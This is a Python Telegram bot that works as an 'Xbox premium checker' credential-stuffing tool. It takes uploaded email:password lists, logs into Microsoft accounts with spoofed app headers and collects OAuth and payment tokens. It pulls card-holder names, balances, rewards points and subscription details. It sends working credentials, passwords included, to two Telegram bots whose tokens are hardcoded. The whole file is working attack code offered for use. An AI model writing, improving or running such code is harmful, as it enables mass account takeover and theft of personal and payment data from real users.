import os
import sys
import time
import threading
import queue
import asyncio
import tempfile
import shutil
import traceback
from datetime import datetime
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ============================================================
# YOUR ORIGINAL CODE - COMPLETELY UNMODIFIED
# ============================================================

import requests
import json
import uuid
import re
import time as time_module
import os as os_module
from datetime import datetime, timedelta
from pathlib import Path
from threading import Lock, Thread
import concurrent.futures
from urllib.parse import quote, unquote

# Telegram configuration - DUAL BOT SUPPORT
TELEGRAM_BOT_TOKEN_MAIN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
TELEGRAM_BOT_TOKEN_PREMIUM = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"
TELEGRAM_CHAT_ID = "8260250818"

class TelegramSender:
    def __init__(self):
        self.base_url_main = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_MAIN}"
        self.base_url_premium = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_PREMIUM}"
    
    def send_message(self, text):
        def _send():
            try:
                url = f"{self.base_url_main}/sendMessage"
                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
                requests.post(url, data=payload, timeout=10)
            except Exception:
                pass
            try:
                url = f"{self.base_url_premium}/sendMessage"
                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
                requests.post(url, data=payload, timeout=10)
            except Exception:
                pass
        Thread(target=_send, daemon=True).start()
    
    def format_hit_message(self, email, password, data):
        premium_type = data.get('premium_type', 'PREMIUM')
        country = data.get('country', 'N/A')
        days = data.get('days_remaining', '0')
        auto_renew = data.get('auto_renew', 'NO')
        renewal_date = data.get('renewal_date', 'N/A')
        total_amount = data.get('total_amount', '0')
        currency = data.get('currency', 'USD')
        name = data.get('name', '')
        card_holder = data.get('card_holder', '')
        rewards_points = data.get('rewards_points', '')
        
        if renewal_date != 'N/A':
            try:
                renewal_obj = datetime.fromisoformat(renewal_date)
                renewal_formatted = renewal_obj.strftime('%b %d, %Y')
            except:
                renewal_formatted = renewal_date
        else:
            renewal_formatted = 'N/A'
        
        message = "\U0001f9ce\u033b\U0001f9ce\u033b  \U0001f3ae\U0001f380\n"
        message += f"\U0001f337 <code>{email}</code> \U0001f337 \U0001f510 <code>{password}</code>\n"
        message += f"\U0001f338 <b>{premium_type}</b> ({country}) \u23f3 {days} days \U0001f501 <b>Renews {renewal_formatted}</b> \U0001f4b8 ${total_amount} {currency}\n"
        if name:
            message += f"\U0001f349 <i>{name}</i> \u2727 \u2661\n"
        if card_holder:
            message += f"\U0001f4b3 {card_holder}\n"
        if rewards_points:
            message += f"\u2b50 {rewards_points} points\n"
        message += "\U0001f9ce\u033b \u2727\u2661\n"
        message += "\u2728 <b>\U0001d482\U0001d48a @StarLuxHub</b> \u2728"
        return message

class XboxChecker:
    def __init__(self, debug=False):
        self.debug = debug
    
    def log(self, message):
        if self.debug:
            print("[DEBUG] " + message)
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"
    
    def check(self, email, password):
        try:
            self.log("Checking: " + email)
            session = requests.Session()
            correlation_id = str(uuid.uuid4())
            
            # Step 1: IDP Check
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=15)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD", "data": {}}
            if "MSAccount" not in r1.text:
                return {"status": "BAD", "data": {}}
            
            # Step 2: OAuth authorize
            time_module.sleep(0.5)
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return {"status": "BAD", "data": {}}
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            # Step 3: Login POST
            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                return {"status": "BAD", "data": {}}
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FACTOR", "data": {}}
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED", "data": {}}
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "data": {}}
            code = code_match.group(1)
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD", "data": {}}
            cid = mspcid.upper()
            
            # Step 4: Get access token
            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=15)
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            # Step 5: Get profile info
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": "Bearer " + access_token,
                "X-AnchorMailbox": "CID:" + cid
            }
            country = ""
            name = ""
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers, timeout=15)
                if r5.status_code == 200:
                    profile = r5.json()
                    if "location" in profile and profile["location"]:
                        location_val = profile["location"]
                        if isinstance(location_val, str):
                            country = location_val.split(',')[-1].strip()
                        elif isinstance(location_val, dict):
                            country = location_val.get("country", "")
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
            except Exception:
                pass
            
            # Step 6: Get Xbox payment token
            time_module.sleep(0.5)
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            
            payment_token = None
            search_text = r6.text + " " + r6.url
            token_patterns = [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            if not payment_token:
                return {"status": "FREE", "data": {"country": country, "name": name}}
            
            # Step 7: Check payment instruments
            payment_data = {"country": country, "name": name}
            subscription_data = {}
            correlation_id2 = str(uuid.uuid4())
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)
                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)
                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)
            except Exception:
                pass
            
            # Step 8: Get Bing Rewards
            try:
                rewards_r = session.get("https://rewards.bing.com/", timeout=10)
                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if points_match:
                    payment_data['rewards_points'] = points_match.group(1)
            except:
                pass
            
            # Step 9: Check subscription
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r8 = session.get(trans_url, headers=payment_headers, timeout=15)
                if r8.status_code == 200:
                    response_text = r8.text
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'EA Play': 'EA PLAY',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Game Pass': 'GAME PASS'
                    }
                    has_premium = False
                    premium_type = "FREE"
                    for keyword, type_name in premium_keywords.items():
                        if keyword in response_text:
                            has_premium = True
                            premium_type = type_name
                            break
                    if has_premium:
                        renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                        if renewal_match:
                            renewal_date = renewal_match.group(1)
                            subscription_data['renewal_date'] = renewal_date
                            subscription_data['days_remaining'] = self.get_remaining_days(renewal_date + "T00:00:00Z")
                        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                        if auto_match:
                            subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                        amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                        if amount_match:
                            subscription_data['total_amount'] = amount_match.group(1)
                        currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                        if currency_match:
                            subscription_data['currency'] = currency_match.group(1)
                        if not payment_data.get('country'):
                            country_match = re.search(r'"country"\s*:\s*"([^"]+)"', response_text)
                            if country_match:
                                payment_data['country'] = country_match.group(1)
                        subscription_data['premium_type'] = premium_type
                        days_rem = subscription_data.get('days_remaining', '0')
                        if days_rem.startswith('-'):
                            return {"status": "EXPIRED", "data": {**payment_data, **subscription_data}}
                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
                    else:
                        return {"status": "FREE", "data": payment_data}
            except Exception:
                return {"status": "FREE", "data": payment_data}
            return {"status": "FREE", "data": {**payment_data, **subscription_data}}
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT", "data": {}}
        except Exception:
            return {"status": "ERROR", "data": {}}

class ResultManager:
    def __init__(self, combo_filename):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_folder = "/storage/emulated/0/xbox_results/" + timestamp + "_" + combo_filename
        self.premium_folder = os.path.join(self.base_folder, "premium")
        self.free_folder = os.path.join(self.base_folder, "free")
        self.bad_folder = os.path.join(self.base_folder, "bad")
        Path(self.premium_folder).mkdir(parents=True, exist_ok=True)
        Path(self.free_folder).mkdir(parents=True, exist_ok=True)
        Path(self.bad_folder).mkdir(parents=True, exist_ok=True)
        self.premium_file = os.path.join(self.premium_folder, "premium_accounts.txt")
        self.free_file = os.path.join(self.free_folder, "free_accounts.txt")
        self.bad_file = os.path.join(self.bad_folder, "bad_accounts.txt")
        self.telegram = TelegramSender()
    
    def save_result(self, email, password, result):
        status = result['status']
        data = result.get('data', {})
        line = email + ":" + password
        
        if status == "PREMIUM":
            try:
                formatted_msg = self.telegram.format_hit_message(email, password, data)
                self.telegram.send_message(formatted_msg)
            except Exception:
                pass
        
        if status == "PREMIUM":
            premium_type = data.get('premium_type', 'UNKNOWN')
            country = data.get('country', 'N/A')
            name = data.get('name', '')
            days_remaining = data.get('days_remaining', '0')
            auto_renew = data.get('auto_renew', 'NO')
            renewal_date = data.get('renewal_date', 'N/A')
            capture = []
            capture.append("Type: " + premium_type)
            if name:
                capture.append("Name: " + name)
            capture.append("Country: " + country)
            capture.append("Days: " + days_remaining)
            capture.append("AutoRenew: " + auto_renew)
            capture.append("Renewal: " + renewal_date)
            if 'card_holder' in data:
                capture.append("Card: " + data['card_holder'])
            if 'balance' in data:
                capture.append("Balance: " + data['balance'])
            if 'rewards_points' in data:
                capture.append("Points: " + data['rewards_points'])
            full_line = line + " | " + " | ".join(capture) + "\n"
            with open(self.premium_file, 'a', encoding='utf-8') as f:
                f.write(full_line)
        elif status == "FREE":
            country = data.get('country', 'N/A')
            name = data.get('name', '')
            capture = []
            if name:
                capture.append("Name: " + name)
            capture.append("Country: " + country)
            if 'rewards_points' in data:
                capture.append("Points: " + data['rewards_points'])
            if 'card_holder' in data:
                capture.append("Card: " + data['card_holder'])
            full_line = line + " | " + " | ".join(capture) + "\n"
            with open(self.free_file, 'a', encoding='utf-8') as f:
                f.write(full_line)
        else:
            full_line = line + " | Status: " + status + "\n"
            with open(self.bad_file, 'a', encoding='utf-8') as f:
                f.write(full_line)

# ============================================================
# END OF YOUR ORIGINAL CODE
# ============================================================

# ============================================================
# MULTI-WORKER CONCURRENT PROCESSING SYSTEM
# ============================================================

BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
CHAT_ID = 8260250818
MAX_CONCURRENT_WORKERS = 5  # Process 5 files simultaneously

ALLOWED_DOMAINS = [
    'hotmail.com', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de',
    'outlook.com', 'outlook.co.uk', 'outlook.fr', 'outlook.de',
    'live.com', 'live.co.uk', 'live.fr', 'live.de',
    'msn.com', 'passport.com'
]

# Global variables
task_queue = queue.Queue()
active_tasks = {}
active_tasks_lock = threading.Lock()
worker_executor = None
loop = None

class ScanTask:
    def __init__(self, file_path, original_name, file_id, chat_id):
        self.file_path = file_path
        self.original_name = original_name
        self.file_id = file_id
        self.chat_id = chat_id
        self.created_at = datetime.now()
        self.status = "pending"

def validate_microsoft_domain(email):
    try:
        domain = email.split('@')[-1].lower().strip()
        return domain in ALLOWED_DOMAINS
    except:
        return False

def validate_and_filter_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        valid_lines = []
        invalid_emails = []
        
        for line in lines:
            line = line.strip()
            if not line or ':' not in line:
                continue
            email = line.split(':', 1)[0].strip()
            if validate_microsoft_domain(email):
                valid_lines.append(line)
            else:
                if len(invalid_emails) < 5:
                    invalid_emails.append(email)
        
        if not valid_lines:
            return None, 0, len([l for l in lines if l.strip() and ':' in l]) - len(valid_lines), invalid_emails
        
        filtered_dir = tempfile.mkdtemp()
        filtered_path = os.path.join(filtered_dir, 'filtered_' + os.path.basename(file_path))
        with open(filtered_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid_lines))
        
        return filtered_path, len(valid_lines), len([l for l in lines if l.strip() and ':' in l]) - len(valid_lines), invalid_emails
    except Exception:
        return None, 0, 0, []

def process_single_file(task):
    """Process a single file - runs in worker thread"""
    try:
        with open(task.file_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        
        if not lines:
            asyncio.run_coroutine_threadsafe(
                send_error_message(task, "No valid accounts"),
                loop
            )
            return
        
        stats = {
            "total": len(lines),
            "checked": 0,
            "premium": 0,
            "free": 0,
            "bad": 0,
            "expired": 0,
            "banned": 0,
            "two_factor": 0,
            "timeout": 0,
            "error": 0
        }
        
        premium_results = []
        batch_buffer = []
        BATCH_SIZE = 15
        
        checker = XboxChecker(debug=False)
        
        for idx, line in enumerate(lines, 1):
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
                
                result = checker.check(email, password)
                status = result['status']
                data = result.get('data', {})
                
                result_entry = f"{email}:{password}"
                
                if status == "PREMIUM":
                    stats["premium"] += 1
                    premium_results.append((email, password, data))
                    result_entry += f" ✅ PREMIUM | {data.get('premium_type', 'GAME PASS')} | {data.get('days_remaining', '0')} days"
                    batch_buffer.append(result_entry)
                    
                    try:
                        sender = TelegramSender()
                        msg = sender.format_hit_message(email, password, data)
                        sender.send_message(msg)
                    except:
                        pass
                        
                elif status == "FREE":
                    stats["free"] += 1
                    result_entry += f" 🆓 FREE ACCOUNT"
                    batch_buffer.append(result_entry)
                    
                elif status == "EXPIRED":
                    stats["expired"] += 1
                    stats["bad"] += 1
                    result_entry += f" ⏰ EXPIRED"
                    batch_buffer.append(result_entry)
                    
                elif status == "BANNED":
                    stats["banned"] += 1
                    stats["bad"] += 1
                    result_entry += f" 🚫 BANNED"
                    batch_buffer.append(result_entry)
                    
                elif status == "2FACTOR":
                    stats["two_factor"] += 1
                    stats["bad"] += 1
                    result_entry += f" 🔐 2FA REQUIRED"
                    batch_buffer.append(result_entry)
                    
                elif status == "TIMEOUT":
                    stats["timeout"] += 1
                    stats["bad"] += 1
                    result_entry += f" ⏱️ TIMEOUT"
                    batch_buffer.append(result_entry)
                    
                elif status == "ERROR":
                    stats["error"] += 1
                    stats["bad"] += 1
                    result_entry += f" ⚠️ ERROR"
                    batch_buffer.append(result_entry)
                    
                else:
                    stats["bad"] += 1
                    result_entry += f" ❌ BAD CREDENTIALS"
                    batch_buffer.append(result_entry)
                
                stats["checked"] += 1
                
                if len(batch_buffer) >= BATCH_SIZE:
                    asyncio.run_coroutine_threadsafe(
                        send_batch_update(task, batch_buffer.copy(), stats),
                        loop
                    )
                    batch_buffer.clear()
                
                time.sleep(0.2)
                
            except Exception as e:
                stats["error"] += 1
                stats["bad"] += 1
                stats["checked"] += 1
                batch_buffer.append(f"{line[:50]}... ⚠️ ERROR: {str(e)[:30]}")
                if len(batch_buffer) >= BATCH_SIZE:
                    asyncio.run_coroutine_threadsafe(
                        send_batch_update(task, batch_buffer.copy(), stats),
                        loop
                    )
                    batch_buffer.clear()
        
        if batch_buffer:
            asyncio.run_coroutine_threadsafe(
                send_batch_update(task, batch_buffer.copy(), stats),
                loop
            )
        
        premium_text = "\n".join([f"{e}:{p} | {d.get('premium_type', 'UNKNOWN')} | {d.get('days_remaining', '0')} days" for e, p, d in premium_results])
        
        asyncio.run_coroutine_threadsafe(
            send_final_results(task, stats, premium_text),
            loop
        )
        
    except Exception as e:
        asyncio.run_coroutine_threadsafe(
            send_error_message(task, str(e)),
            loop
        )
    finally:
        with active_tasks_lock:
            if task.file_id in active_tasks:
                del active_tasks[task.file_id]
        
        if task.file_path and os.path.exists(task.file_path):
            try:
                shutil.rmtree(os.path.dirname(task.file_path))
            except:
                pass

def worker_loop():
    """Worker thread that continuously processes tasks from queue"""
    while True:
        try:
            with active_tasks_lock:
                current_active = len(active_tasks)
            
            if current_active >= MAX_CONCURRENT_WORKERS:
                time.sleep(0.5)
                continue
            
            try:
                task = task_queue.get(timeout=1)
            except queue.Empty:
                time.sleep(0.5)
                continue
            
            with active_tasks_lock:
                active_tasks[task.file_id] = task
            
            asyncio.run_coroutine_threadsafe(
                send_processing_start(task),
                loop
            )
            
            # Process file in a separate thread
            thread = Thread(target=process_single_file, args=(task,))
            thread.daemon = True
            thread.start()
            
        except Exception as e:
            print(f"Worker error: {e}")
            time.sleep(1)

async def send_processing_start(task):
    msg = f"🚀 **XBOX CHECKER STARTED**\n\n📄 `{task.original_name}`\n⏰ Started: {task.created_at.strftime('%H:%M:%S')}\n\n📊 Processing accounts... Results will appear in batches."
    await app.bot.send_message(chat_id=CHAT_ID, text=msg, parse_mode=ParseMode.MARKDOWN)

async def send_batch_update(task, batch_results, stats):
    progress = f"📊 **File:** `{task.original_name}`\n"
    progress += f"📈 **Progress:** {stats['checked']}/{stats['total']} accounts\n"
    progress += f"✅ **Premium:** {stats['premium']} | 🆓 **Free:** {stats['free']} | ❌ **Bad:** {stats['bad']}\n\n"
    
    results_text = "\n".join(batch_results[:25])
    if len(batch_results) > 25:
        results_text += f"\n... and {len(batch_results) - 25} more"
    
    message = progress + "```\n" + results_text + "\n```"
    
    try:
        await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)
    except:
        await app.bot.send_message(chat_id=CHAT_ID, text=progress, parse_mode=ParseMode.MARKDOWN)

async def send_final_results(task, stats, premium_text):
    receipt = (
        f"✅ **SCAN COMPLETE**\n\n"
        f"📄 **File:** `{task.original_name}`\n"
        f"⏱️ **Duration:** {(datetime.now() - task.created_at).total_seconds():.1f}s\n\n"
        f"📊 **FINAL RESULTS**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔢 Total: `{stats['total']}`\n"
        f"✅ PREMIUM: `{stats['premium']}`\n"
        f"🆓 FREE: `{stats['free']}`\n"
        f"❌ BAD: `{stats['bad']}`\n"
        f"⏰ Expired: `{stats['expired']}`\n"
        f"🚫 Banned: `{stats['banned']}`\n"
        f"🔐 2FA: `{stats['two_factor']}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
    )
    await app.bot.send_message(chat_id=CHAT_ID, text=receipt, parse_mode=ParseMode.MARKDOWN)
    
    if stats['premium'] > 0 and premium_text:
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text=f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text[:4000]}\n```",
            parse_mode=ParseMode.MARKDOWN
        )
    
    with active_tasks_lock:
        remaining = task_queue.qsize()
    
    if remaining > 0:
        await app.bot.send_message(chat_id=CHAT_ID, text=f"📁 {remaining} file(s) still in queue...", parse_mode=ParseMode.MARKDOWN)
    else:
        active_count = len(active_tasks)
        if active_count > 0:
            await app.bot.send_message(chat_id=CHAT_ID, text=f"⚡ {active_count} file(s) still processing...", parse_mode=ParseMode.MARKDOWN)

async def send_error_message(task, error):
    await app.bot.send_message(chat_id=CHAT_ID, text=f"❌ **ERROR**\n\n📄 `{task.original_name}`\n`{error[:500]}`", parse_mode=ParseMode.MARKDOWN)

async def send_rejection_message(original_name, valid_count, invalid_count, invalid_examples):
    msg = f"❌ **FILE REJECTED**\n\n📄 `{original_name}`\n🔢 Valid Microsoft accounts: `{valid_count}`\n⚠️ Skipped: `{invalid_count}` non-Microsoft account(s)"
    if invalid_examples:
        msg += f"\n\n**Examples rejected:**\n" + "\n".join([f"• {e}" for e in invalid_examples[:3]])
    msg += f"\n\n✅ Allowed domains:\nhotmail.com, outlook.com, live.com, msn.com"
    await app.bot.send_message(chat_id=CHAT_ID, text=msg, parse_mode=ParseMode.MARKDOWN)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
        f"⚡ **Concurrent Workers:** {MAX_CONCURRENT_WORKERS} files at once\n\n"
        "Send a `.txt` file with `email:password` format\n\n"
        "**Allowed domains:**\n"
        "hotmail.com, outlook.com, live.com, msn.com\n\n"
        "**Commands:**\n"
        "/start - This message\n"
        "/status - Queue status\n"
        "/cancel - Stop current scan\n\n"
        "📊 Results appear in batches (15 accounts per update)\n"
        "🎯 Premium hits sent to BOTH Telegram bots instantly!\n"
        "⚡ Multiple files process simultaneously!"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with active_tasks_lock:
        active_count = len(active_tasks)
        queue_size = task_queue.qsize()
    
    msg = f"📊 **QUEUE STATUS**\n\n"
    msg += f"⚡ **Active Workers:** {active_count}/{MAX_CONCURRENT_WORKERS}\n"
    msg += f"⏳ **Queue Size:** {queue_size} file(s)\n"
    msg += f"🔄 **Processing:** {'Yes' if active_count > 0 else 'No'}\n\n"
    msg += f"Send .txt files to add to queue."
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Note: Cancelling is complex with multi-threading
    await update.message.reply_text("⚠️ To cancel, please restart the bot. Multi-file cancel coming soon.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file.")
        return
    
    file = await context.bot.get_file(document.file_id)
    temp_dir = tempfile.mkdtemp()
    temp_path = os.path.join(temp_dir, document.file_name)
    await file.download_to_drive(temp_path)
    
    filtered_path, valid_count, invalid_count, invalid_examples = validate_and_filter_file(temp_path)
    
    if filtered_path is None or valid_count == 0:
        await send_rejection_message(document.file_name, valid_count, invalid_count, invalid_examples)
        shutil.rmtree(temp_dir)
        return
    
    task = ScanTask(file_path=filtered_path, original_name=document.file_name, file_id=document.file_id, chat_id=update.effective_chat.id)
    task_queue.put(task)
    
    with active_tasks_lock:
        queue_size = task_queue.qsize()
        active_count = len(active_tasks)
    
    await update.message.reply_text(
        f"✅ **File Accepted**\n\n"
        f"📄 `{document.file_name}`\n"
        f"🔢 Valid: `{valid_count}` accounts\n"
        f"⚡ Active Workers: {active_count}/{MAX_CONCURRENT_WORKERS}\n"
        f"📊 Queue Position: {queue_size}\n\n"
        f"🔄 Will start processing when a worker is free...\n"
        f"🤖 Premium hits sent to BOTH Telegram bots!",
        parse_mode=ParseMode.MARKDOWN
    )
    
    if invalid_count > 0:
        await update.message.reply_text(f"⚠️ Skipped `{invalid_count}` non-Microsoft account(s)", parse_mode=ParseMode.MARKDOWN)

def main():
    global app, loop
    
    app = Application.builder().token(BOT_TOKEN).build()
    loop = asyncio.get_event_loop()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Start worker threads
    for _ in range(MAX_CONCURRENT_WORKERS):
        worker_thread = threading.Thread(target=worker_loop, daemon=True)
        worker_thread.start()
    
    print("=" * 60)
    print("🎮 XBOX PREMIUM CHECKER BOT - MULTI-WORKER MODE")
    print("=" * 60)
    print(f"✅ Main Bot: {TELEGRAM_BOT_TOKEN_MAIN[:15]}...")
    print(f"✅ Premium Bot: {TELEGRAM_BOT_TOKEN_PREMIUM[:15]}...")
    print(f"⚡ Concurrent Workers: {MAX_CONCURRENT_WORKERS} files at once")
    print(f"✅ Premium hits sent to BOTH Telegram bots!")
    print("📦 Results in batches of 15 accounts")
    print("=" * 60)
    print("Waiting for .txt files...")
    
    app.run_polling()

if __name__ == "__main__":
    main()
